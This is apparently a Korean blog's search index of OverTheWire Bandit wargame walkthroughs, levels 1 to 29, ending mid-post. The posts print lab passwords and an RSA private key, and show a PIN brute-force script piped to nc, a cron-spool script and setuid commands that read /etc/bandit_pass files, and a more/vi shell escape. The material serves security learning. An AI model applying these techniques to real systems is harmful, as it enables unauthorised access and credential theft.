{"pages":[],"posts":[{"title":"bandit 워게임 level1 풀이","text":"Level Goal The password for the next level is stored in a file called - located in the home directory 다음 레벨의 비밀번호는 홈 디렉토리에 있는 - 라는 파일에 저장되어있다. 파일안에 있는 내용을 보기 위해 cat명령어를 사용하여 내용을 출력한다. cat ./- level2의 패스워드를 찾았다! CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9","link":"/2022/01/09/Bandit/bandit1/"},{"title":"bandit 워게임 level10 풀이","text":"Level Goal The password for the next level is stored in the file data.txt, which contains base64 encoded data 다음 레벨의 비밀번호는 base64로 인코딩된 데이터가 포함된 data.txt 파일에 저장되어있다. data.txt의 내용이 base64로 인코딩되어 있다. 이를 base64명령어로 다시 디코딩 하면 될것 같다. base64 -d data.txt 옵션 설명 없음 base64로 인코딩 -d base64로 된 데이터 디코딩 -i 디코딩 할 때, 알파벳이 아닌 문자 무시 level11의 패스워드를 찾았다! IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR","link":"/2022/01/09/Bandit/bandit10/"},{"title":"bandit 워게임 level11 풀이","text":"Level Goal The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions 다음 레벨의 비밀번호는 data.txt 파일에 저장됩니다. 여기서 모든 소문자(a-z) 및 대문자(A-Z)가 13자리 회전되어있다. data.txt의 내용이 13자리씩 밀려 있다.A는 N이 되고 B는 O, C는 P… 13자리씩 밀려 있으니 다시 13번 밀면 다시 원점으로 돌아온다.(알파벳은 25자리) tr명령어를 사용한다. cat data.txt | tr ‘A-Za-z’ ‘N-ZA-Mn-za-m’ level12의 패스워드를 찾았다! 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu","link":"/2022/01/09/Bandit/bandit11/"},{"title":"bandit 워게임 level12 풀이","text":"Level Goal The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!) 다음 레벨의 비밀번호는 반복적으로 압축된 파일의 16진 덤프인 data.txt 파일에 저장됩니다. 이 수준의 경우 아래에 디렉터리를 만드는 것이 유용할 수 있다. /tmp에서 mkdir을 사용하여 작업할 수 있습니다. 예: mkdir /tmp/myname123. 그런 다음 cp를 사용하여 데이터 파일을 복사하고 mv를 사용하여 이름을 바꿉니다(맨페이지 읽기!) 노가다 주의!!!!data.txt의 내용이 16진수로 덤프되어있다.일단 /tmp에 아무 디렉토리를 만들고 data.txt를 복사해온다. xxd명령어를 사용하여 16진수 데이터를 바이너리 데이터로 변환한다. xxd -r data.txt data file을 이용해 속성값을 확인하다. 데이터는 gzip으로 압축되었다고한다.data의 확장자를 gz로 바꾸고 압축을 푼다. 속성값을 다시 확인하니 bzip2으로 압축되었다고 한다.data의 확장자를 bz로 바꾸고 압축을 푼다. 속성값을 다시 확인하니 gzip으로 압축되었다고 한다.data의 확장자를 gz로 바꾸고 압축을 푼다. 속성값을 다시 확인하니 tar으로 묶여있다data의 확장자를 tar로 바꾸고 푼다. data5.bin의 속성을 확인하니 tar으로 묶여있다data의 확장자를 tar로 바꾸고 푼다. 속성값을 다시 확인하니 bzip2으로 압축되었다고 한다.data의 확장자를 bz로 바꾸고 압축을 푼다. data6의 속성을 확인하니 tar으로 묶여있다data의 확장자를 tar로 바꾸고 푼다. 속성값을 다시 확인하니 gzip으로 압축되었다고 한다.data의 확장자를 gz로 바꾸고 압축을 푼다. 드디어 길고길었던 노가다가 끝났다.level13의 패스워드를 찾았다! 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL","link":"/2022/01/09/Bandit/bandit12/"},{"title":"bandit 워게임 level13 풀이","text":"Level Goal The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on 다음 레벨의 비밀번호는 /etc/bandit_pass/bandit14에 저장되며 bandit14 사용자만 읽을 수 있습니다. 이 수준의 경우 다음 암호를 얻지 못하지만 다음 수준에 로그인하는 데 사용할 수 있는 개인 SSH 키를 얻습니다. 참고: localhost는 작업 중인 시스템을 나타내는 호스트 이름이다. 파일 이름을 보니 ssh 비밀키 인것 같다. 비밀키가 별도의 저장소에 저장되어 있다.그럴 때에는 -i 옵션을 사용하여 경로를 지정하면 된다. ssh -i sshkey.private bandit14@localhost bandit14계정에 접속하였다. level14의 패스워드를 찾았다! 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e","link":"/2022/01/09/Bandit/bandit13/"},{"title":"bandit 워게임 level14 풀이","text":"Level Goal The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost. 다음 수준의 암호는 현재 수준의 암호를 localhost의 포트 30000에 제출하여 검색할 수 있다. ssh로 30000포트에 접속시도 했을땐 접속이 거부당한다. ssh -p 30000 localhost 아마 telnet으로 접속해야 될것 같다. telnet localhost 30000 비번은 14레벨 암호를 치면 된다. 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e level15의 패스워드를 찾았다! BfMYroe26WYalil77FoDi9qh59eK5xNr","link":"/2022/01/09/Bandit/bandit14/"},{"title":"bandit 워게임 level15 풀이","text":"Level Goal The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command… 다음 레벨의 비밀번호는 SSL 암호화를 사용하여 localhost의 포트 30001에 현재 레벨의 비밀번호를 제출하여 검색할 수 있습니다. 도움이 되는 메모: “HEARTBEATING” 및 “Read R BLOCK”이 필요하십니까? -ign_eof를 사용하고 맨페이지의 “CONNECTED COMMANDS” 섹션을 읽으십시오. ‘R’ 및 ‘Q’ 옆에 ‘B’ 명령은 해당 명령의 이 버전에서도 작동합니다… s_client는 SSL/TLS를 사용하는 원격 호스트에 접속하기 위한 SSL/TLS client를 구현하는 명령어이다. openssl s_client -connect localhost:30001 telnet localhost 30000 비번은 15레벨 암호를 치면 된다. BfMYroe26WYalil77FoDi9qh59eK5xNr level16의 패스워드를 찾았다! cluFn7wTiGryunymYOu4RcffSxQluehd","link":"/2022/01/09/Bandit/bandit15/"},{"title":"bandit 워게임 level16 풀이","text":"Level Goal The credentials for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it. 다음 레벨의 자격 증명은 현재 레벨의 비밀번호를 31000 ~ 32000 범위의 localhost 포트에 제출하여 검색할 수 있습니다. 먼저 이러한 포트 중 서버가 수신 대기하는 포트를 찾으십시오. 그런 다음 SSL을 사용하는 것과 그렇지 않은 것을 찾으십시오. 다음 자격 증명을 제공할 서버는 1개뿐이며 나머지 서버는 귀하가 보내는 모든 것을 다시 귀하에게 보냅니다. nmap을 통해 31000~32000범위의 포트 중 열려 있는 포트를 찾는다 nmap -p 31000-32000 localhost 4개의 포트가 나왔다.일단 전부다 ssl 연결을 하여 ssl을 사용하고 있는지 확인한다. openssl s_client -connect localhost:[포트번호] 31790 포트만이 레벨 16의 패스워드를 입력했을때 비밀키를 반환한다. cluFn7wTiGryunymYOu4RcffSxQluehd 비밀키를 복사해서 /tmp 디렉토리에 파일을 만들고 복사한다. (예전에 tmp에 파일이나 디렉토리를 만들수 있다는 힌트가 있었음) —–BEGIN RSA PRIVATE KEY—–MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTuDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbWJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNXx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvDKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBlJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovdd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nCYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8AvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnxSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHdHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+ExdvtSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0AR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDiTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCgR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiuL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Niblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkUYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0bdxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=—–END RSA PRIVATE KEY—– 레벨 13에서 했던것 처럼 경로를 잡아주고 ssh접속을 한다. 권한떄문에 접속이 거부 됬다. 파일의 권한을 700으로 바꿔서 시도한다. chmod 700 /tmp/private_key1231231123 다시 접속해 본다. 홈 디렉토리엔 파일이 2개 있지만 이것 level18를 가기 위한 파일인 것 같다. 각 패스워드 비번이 있는 /etc/bandit_pass에 들어가 패스워드 파일을 출력해 본다. level17의 패스워드를 찾았다! xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn","link":"/2022/01/09/Bandit/bandit16/"},{"title":"bandit 워게임 level17 풀이","text":"Level Goal There are 2 files in the homedirectory: passwords.old and passwords.new. The password for the next level is in passwords.new and is the only line that has been changed between passwords.old and passwords.newNOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19 홈디렉토리에는 2개의 파일이 있습니다: passwords.old 및 passwords.new. 다음 레벨의 비밀번호는 passwords.new에 있으며 이것은 passwords.old와 passwords.new 사이에서 변경된 유일한 줄입니다. 참고: 이 레벨을 해결하고 bandit18에 로그인하려고 할 때 ‘Byebye!’가 표시되면 이 다음 레벨 bandit19와 관련이 있습니다. 홈디렉토리에 파일이 두개 있다. 힌트를 보니 두개의 파일을 비교하여 서로 다른 점을 찾으면 될것 같다.diff 명령어를 사용하여 차이점을 찾는다. diff -c passwords.new passwords.old 왼쪽에 **!**표시가 뜬 줄이 차이점이다. 그중 제일 위쪽에 있는 “!”가 있는 줄은 passwords.new안에 있는 내용이고 이것이 패스워드 인것 같다. level18의 패스워드를 찾았다! kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd","link":"/2022/01/09/Bandit/bandit17/"},{"title":"bandit 워게임 level18 풀이","text":"Level Goal The password for the next level is stored in a file readme in the homedirectory. Unfortunately, someone has modified .bashrc to log you out when you log in with SSH. 다음 레벨의 비밀번호는 홈디렉토리의 readme 파일에 저장됩니다. 불행히도 누군가 SSH로 로그인할 때 로그아웃하도록 .bashrc를 수정했습니다. .bashrc는 별칭(alias)과 bash가 수행될 때 실행되는 함수를 제어하는 지역적인(사용자 전용) 시스템 설정과 관련된 셸 스크립트이다. bash셸을 시작할 때마다 즉 터미널 창을 열 떄마다 .bashrc가 자동으로 실행된다. 그래서 bandit18에 로그인하면 연결이 자동으로 종료된다. ssh의 옵션중 -t를 사용하면 된다. ssh -t : 가짜(pseudo) 터미널 강제 할당 ssh bandit18@localhost -t /bin/sh 그냥 -t를 쓰면 bash셸이 실행되니 sh이 실행 될수 있도록 /bin/sh를 쓴다. 로그인을 하여도 연결이 종료되지 않는다. cat readme level19의 패스워드를 찾았다! IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x 추가!/bin/sh를 종료하자마자 .bashrc이 실행됨","link":"/2022/01/09/Bandit/bandit18/"},{"title":"bandit 워게임 level19 풀이","text":"Level Goal To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary. 다음 레벨에 액세스하려면 홈 디렉토리에서 setuid 바이너리를 사용해야 합니다. 인수 없이 실행하여 사용법을 알아보세요. 이 레벨의 비밀번호는 setuid 바이너리를 사용한 후 일반적인 위치(/etc/bandit_pass)에서 찾을 수 있습니다. 홈디렉토리에 bandit20-do파일이 있는데 이에 setuid가 설정 되어 있다. setuid가 설정되어 있으면 파일을 실행한 순간만 그 파일을 소유하고 있는 사용자의 권한으로 실행됩니다. (잠시 권한을 빌려오는 것과 같다.) setuid가 있는 프로그램은 권한 상승을 할수 있는 취약점이 있을 수 있기 때문에 보안상 취약하다. setuid가 설정되어 있으면 소유자 권한의 실행권한(x, X)가 s, S로 되어있다. bandit20-do를 실행보니 setuid 바이너리 사용방법이 나왔다. ./bandit20-do 예시를 보니 ./bandit20-do을 실행해 bandit20권한으로 id를 실행하는 것 같다. id자리에 /etc/bandit_pass/bandit20을 실행하면 될 것 같다. level20의 패스워드를 찾았다! GbKksEFF4yrVs6il55v6gwY5aVje5f0j","link":"/2022/01/09/Bandit/bandit19/"},{"title":"bandit 워게임 level2 풀이","text":"Level Goal The password for the next level is stored in a file called spaces in this filename located in the home directory 다음 레벨의 비밀번호는 홈 디렉토리에 있는 spaces in this filename이라는 파일에 저장되어있다. 파일 이름에 공백(스페이스)가 있거나 넣고 싶은 경우는 **\\(역슬래시)**를 사용한다. cat ./spaces\\ in\\ this\\ filename (tab키를 치면 쉽다) level3의 패스워드를 찾았다! UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK","link":"/2022/01/09/Bandit/bandit2/"},{"title":"bandit 워게임 level20 풀이","text":"Level Goal There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21). NOTE: Try connecting to your own network daemon to see if it works as you think 홈 디렉토리에 다음을 수행하는 setuid 바이너리가 있습니다. 명령줄 인수로 지정한 포트에서 localhost에 연결합니다. 그런 다음 연결에서 텍스트 줄을 읽고 이전 수준(bandit20)의 암호와 비교합니다. 암호가 정확하면 다음 레벨(bandit21)의 암호를 전송합니다. 참고: 자신의 네트워크 데몬에 연결하여 생각한 대로 작동하는지 확인하십시오. 홈디렉토리에 suconnect라는 파일이 있다. 이를 실행 보면 다음과 같은 문구가 나온다. This program will connect to the given port on localhost using TCP. If it receives the correct password from the other side, the next password is transmitted back. 이 프로그램은 TCP를 사용하여 localhost의 지정된 포트에 연결합니다. 상대방으로부터 올바른 비밀번호를 받으면 다음 비밀번호를 다시 전송합니다. 처음엔 포트를 찾는 문제인줄 알고 삽질하다가 포트를 임의로 지정하여 열어주면 된다는 것을 알게되었다.(결론: 답지 봤다..) tmux명령어를 사용하면 창분할을 할 수 있다. 창 분할(ctrl + b)누르고 % : 좌우로 나누기(ctrl + b)누르고 “ : 위아래로 나누기 창 이동(ctrl + b)누르고 방향키 : 지정한 방향의 창으로 이동 nc -l -p 3333[아무포트번호]포트를 열어준뒤 level20의 패스워드를 입력한 후 옆창으로 이동해 **./suconnect [포트번호]**를 치면 입력받은 패스워드를 비교해서 맞으면 level21의 패스워드를 반환받는다. level21의 패스워드를 찾았다! gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr","link":"/2022/01/09/Bandit/bandit20/"},{"title":"bandit 워게임 level21 풀이","text":"Level Goal A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. 시간 기반 작업 스케줄러인 cron에서 일정 간격으로 프로그램이 자동으로 실행됩니다. /etc/cron.d/에서 구성을 찾고 어떤 명령이 실행되고 있는지 확인하십시오. **/etc/cron.d/**에 무엇이 있는지 확인하다. 여러가지 파일이 있지만 bandit22의 패스워드가 궁금하기에cronjob_bandit22파일을 출력해 본다. 출력한 내용을 보니/usr/bin/cronjob_bandit22.sh를 부팅시, 1분마다 실행하고 출력 결과를 폐기해라(/dev/null에 넣어라)라고 되어있다. /usr/bin/cronjob_bandit22.sh가 수상해 보이니 출력해본다. 출력 내용을 보니/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv의 사용권한을 644로 바꾸고 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv에 /etc/bandit_pass/bandit22파일 출력 내용을 저장하도록 되어 있다. /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv을 출력해본다 level22의 패스워드를 찾았다! Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI","link":"/2022/01/09/Bandit/bandit21/"},{"title":"bandit 워게임 level22 풀이","text":"Level Goal A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints. 시간 기반 작업 스케줄러인 cron에서 일정 간격으로 프로그램이 자동으로 실행됩니다. /etc/cron.d/에서 구성을 찾고 어떤 명령이 실행되고 있는지 확인하십시오. 참고: 다른 사람이 작성한 쉘 스크립트를 보는 것은 매우 유용한 기술입니다. 이 레벨의 스크립트는 의도적으로 읽기 쉽게 만들어졌습니다. 그것이 하는 일을 이해하는 데 문제가 있다면, 그것을 실행하여 출력하는 디버그 정보를 보십시오. **/etc/cron.d/**에 무슨파일이 있는지 확인하고 출력해본다. 내용을보니 level21과 비슷하게 /usr/bin/cronjob_bandit23.sh를 부팅시, 1분마다 실행하고 출력 결과를 폐기해라(/dev/null에 넣어라)라고 되어있다. /usr/bin/cronjob_bandit23.sh를 출력해본다. myname이라는 변수에 whoami의 값을 넣었다. mytarget은 **”I am user (myname값)”**을 md5 해쉬값으로 나타내고 ‘ ‘(공백)을 기준으로 나눈뒤 첫번째 필드를 잘라 출력하는 것이다. 그뒤 **/etc/bandit_pass/(myname값)**의 내용을 /tmp/(mytarget값)에 복사해 출력한다. /usr/bin/cronjob_bandit23.sh를 실행하고 나온 값을 통해 /tmp폴더에 있는 파일을 출력 해본다. level22의 패스워드가 나왔다. whoami는 현재 사용자 즉 bandit22를 가르키기 때문이다. bandit23일때의 mytarget의 값을 안다면 패스워드를 찾을수 있을 것이다. 아까 쉘스크립에서 해쉬값을 자동으로 계산하는 부분에서 whoami받아오는 부분을 수동으로 입력해서 나온 값을 통해 /tmp폴더에 있는 파일을 출력 해본다. level23의 패스워드를 찾았다! jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n","link":"/2022/01/09/Bandit/bandit22/"},{"title":"bandit 워게임 level23 풀이","text":"Level Goal A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level! NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around… 시간 기반 작업 스케줄러인 cron에서 일정 간격으로 프로그램이 자동으로 실행됩니다. /etc/cron.d/에서 구성을 찾고 어떤 명령이 실행되고 있는지 확인하십시오. 참고: 이 수준에서는 첫 번째 셸 스크립트를 만들어야 합니다. 이것은 매우 큰 단계이며 이 레벨을 달성했을 때 스스로를 자랑스러워해야 합니다! 참고 2: 쉘 스크립트는 일단 실행되면 제거되므로 사본을 보관하고 싶을 수도 있습니다. **/etc/cron.d/**에 무슨파일이 있는지 확인하고 출력해본다. /usr/bin/cronjob_bandit24.sh를 출력해본다. echo를 보니 /var/spool/[myname] 안에 있는 모든 스크립트를 실행하고 지운다고 되어 있다. #!/bin/bash myname=$(whoami) //bandit24 (bandit24에서 실행되고 있다.) cd /var/spool/$myname echo \"Executing and deleting all scripts in /var/spool/$myname:\" for i in * .*; // 모든 파일 반복 do if [ \"$i\" != \".\" -a \"$i\" != \"..\" ]; //파일이 .(현재 디렉토리), ..(상위 디렉토리)가 아니라면 실행 then echo \"Handling $i\" owner=\"$(stat --format \"%U\" ./$i)\" //owner라는 변수에 %U - 현재 파일 소유자의 사용자 이름을 넣음 if [ \"${owner}\" = \"bandit23\" ]; then //만약 owner의 값이 bandit23이라면 timeout -s 9 60 ./$i //파일을 실행하고 60초후 프로세스를 종료한다. fi rm -f ./$i //파일을 강제 삭제 fi done /var/spool로 이동해 권한을 확인해 본다. 다른 사용자는 쓰고, 실행할 수 있는 권한이 있다.여기에 쉘스크립트를 작성해서 복사하면 된다. /tmp에 아무 디렉토리를 생성하고 쉘스크립트를 작성한다. /tmp/dir24/pass.sh #!/bin/bash cat /etc/bandit_pass/bandit24 > /tmp/dir24/bandit24pass 생성한 디렉토리와 하위 파일이나 폴더에 777권한을 준다.(왜냐하면 권한이 없으면 파일이 저장되지 않기 때문이다.) chmod -R 777 /tmp/dir24 권한을 부여한 뒤 /var/spool/bandit24에 쉘스크립트를 복사한다.복사한후 1분이 지나고 패스워드가 저장된 파일을 연다. level24의 패스워드를 찾았다! UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ","link":"/2022/01/09/Bandit/bandit23/"},{"title":"bandit 워게임 level24 풀이","text":"Level Goal A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. 데몬은 포트 30002에서 수신 대기 중이며 bandit24에 대한 비밀번호와 비밀 숫자 4자리 핀코드가 제공된 경우 bandit25에 대한 비밀번호를 제공합니다. 무차별 대입(brute-forcing)이라고 하는 10000가지 조합을 모두 통과하는 것 외에는 암호를 검색할 방법이 없습니다. 30002포트로 nc로 연결한다.(Netcat[nc]는 네트워크 연결에서 데이터를 읽고 쓸수 있다.) bandit24의 비밀번호는 알지만 4자리 핀코드를 알수 없기에 하나씩 때려 맞춰야 한다. 그러기엔 경우의수가 1만가지나 있기에 시간이 매우 오래 걸린다. 쉘스크립트를 작성해 빠르게 패스워드를 대입할수 있도록 패스워드 파일을 만든다. /tmp에 디렉토리를 만들고 쉘스크립트 파일을 생성한다. /tmp/bn24/bruteforce.sh #!/bin/bash passwd=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ (bandit24의 패스워드) for i in {0000..9999} (0000, 0001, 0002 ... 9999) do echo $passwd $i >> /tmp/bn24/passlist (패스워드 경우의 수를 파일에 저장) done 파일에 권한을 주고 실행한다. 실행을 하고 나면 파일에 패스워드의 0000부터 9999까지의 모든 경우의 수가 저장되어 있다. 연결할때 경우의 수를 대입하면 된다. cat /tmp/bn24/passlist | nc localhost 30002 level25의 패스워드를 찾았다! uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG","link":"/2022/01/09/Bandit/bandit24/"},{"title":"bandit 워게임 level25 풀이","text":"Level Goal Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it. bandit25에서 bandit26으로 로그인하는 것은 상당히 쉬울 것입니다… bandit26 사용자를 위한 쉘은 /bin/bash가 아니라 다른 것입니다. 그것이 무엇인지, 어떻게 작동하며 어떻게 빠져나갈 수 있는지 알아보십시오. 홈디렉토리에 ssh키가 있다. ssh 접속을 시도해 본다. bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost enjoy your stay ! bandit26를 출력하고 접속을 끝낸다.bandit26의 쉘이 /bin/bash가 아니라 다른 쉘이 실행되서 그런것 같다. bandit26이 사용하는 쉘을 찾는다. 쉘의 내용을 출력해본다. #!/bin/sh export TERM=linux // 터미널 에뮬레이터를 linux로 설정 more ~/text.txt // more로 홈디렉토리에 있는 text.txt 열기 exit 0 // 쉘스크립트를 성공적으로 종료 (범위 : 0~255 [1~255는 오류 코드라고 인식된다.]) 여기선 부터 답쥐를 봤다…(리눅스 초보에겐 너무 어렵다..) putty로 실행한다는 가정하에 putty창을 줄이고 ssh접속을 시도하면exit 0코드가 실행되기 전에 more가 실행된다고한다. more의 옵션에는 v가 있는데 이는 현재 열려있는 파일의 현재 위치에서 vi 편집기를 실행한다고 한다. v를 누르고 vi 확정명령모드(Last Line Mode)에서 다음과 같은 명령어를 입력한다 :e /etc/bandit_pass/bandit26 // /etc/bandit_pass/bandit26을 불러오기 level26의 패스워드를 찾았다! 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z","link":"/2022/01/09/Bandit/bandit25/"},{"title":"bandit 워게임 level26 풀이","text":"Level Goal Good job getting a shell! Now hurry and grab the password for bandit27! 쉘을 잘 얻었습니다! 이제 서둘러 bandit27의 비밀번호를 잡으세요! bandit25를 푸는 방법은 2가지가 있다 more에서 vi를 실행시켜 파일을 읽어 오는 법과 bandit26의 쉘을 /bin/bash로 바꾸어 실행하는 것이 있다. 쉘을 바꾸기 위해서는전단계에서 했던 것 처럼 more에서 vi를 키고 다음과 같은 명령어를 쳐 쉘을 변경한다. :set shell=/bin/bash 변경된 쉘내용을 실행한다. :sh 이제 접속이 끊기지 않고 bandit26계정을 사용할 수 있다! 일단 무슨 파일이 있는지 확인한다. bandit27에 setuid가 설정되어 있다.일단 내용을 확인해본다. 알수 없는 문자들이 많지만 마지막에 힌트가 있는거 같아 Run a command as another user. 다른 사용자로 명령어를 실행한다.Example: %s id 예전에 레벨에 했던 것과 똑같은 풀이법인 것 같다. ./bandit27-do cat /etc/bandit_pass/bandit27 level27의 패스워드를 찾았다! 3ba3118a22e93127a4ed485be72ef5ea","link":"/2022/01/09/Bandit/bandit26/"},{"title":"bandit 워게임 level27 풀이","text":"Level Goal There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28. Clone the repository and find the password for the next level. ssh://bandit28-git@localhost/home/bandit28-git/repo에 git 저장소가 있습니다. bandit27-git 사용자의 비밀번호는 bandit27 사용자의 비밀번호와 동일합니다. 저장소를 복제하고 다음 레벨의 비밀번호를 찾으십시오. git 저장소를 복제해오기만 하면 되는 매우매우 간단한 문제다! /tmp에 저장소를 복제해 저장할 디렉토리를 만들어 주고 해당 디렉토리로 이동한다. 다음과 같은 명령어를 입력해 저장소를 복사해온다. 패스워드는 bandit27의 패스워드와 동일하다. git clone ssh://bandit27-git@localhost/home/bandit27-git/repo 저장소의 내용을 확인해보고 패스워드가 있을만한 파일을 읽어본다. level28의 패스워드를 찾았다! 0ef186ac70e04ea33b4c1853d2526fa2","link":"/2022/01/09/Bandit/bandit27/"},{"title":"bandit 워게임 level28 풀이","text":"Level Goal There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28. Clone the repository and find the password for the next level. ssh://bandit28-git@localhost/home/bandit28-git/repo에 git 저장소가 있습니다. bandit28-git 사용자의 비밀번호는 bandit28 사용자의 비밀번호와 동일합니다. 저장소를 복제하고 다음 레벨의 비밀번호를 찾으십시오. 디렉토리를 만들어 주고 해당 디렉토리에 저장소를 복사한다. git clone ssh://bandit28-git@localhost/home/bandit28-git/repo 일단 무슨 파일이 있는지 확인하고 읽어본다. 패스워드의 정보는 알려주지 않았다…….. (OTL) 힘들게 ./git에 있는 폴더를 하나씩 출력하고 삽질한 끝에 떠올린 히스토리 조회? 리비전 조회! git log를 사용하면 어떤 커밋이 있었는지 조회가 가능하다! 총 3개의 커밋한 흔적이 있다. 차례대로 설명을 읽어보니 다음과 같다. 정보 누출 수정 누락된 데이터 추가 README.md의 초기 커밋 첫번째있는 것이 bandit29의 패스워드가 있을 확률이 높다.커밋한 내용을 확인해본다. git show edd935d60906b33f0619605abd1689808ccdd5ee(커밋 sha 해시값) level29의 패스워드를 찾았다! bbc96594b4e001778eee9975372716b2","link":"/2022/01/09/Bandit/bandit28/"},{"title":"bandit 워게임 level29 풀이","text":"Level Goal There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo. The password for the user bandit29-git is the same as for the user bandit29. Clone the repository and find the password for the next level. ssh://bandit29-git@localhost/home/bandit29-git/repo에 git 저장소가 있습니다. bandit29-git 사용자의 비밀번호는 bandit29 사용자의 비밀번호와 동일합니다. 저장소를 복제하고 다음 레벨의 비밀번호를 찾으십시오. 디렉토리까진 2번씩이나 했으니 생략한다. README.md를 읽어보니 패스워드정보 자체가 없다고 한다. 혹시 모르니 git로그를 확인해본다. 내용을 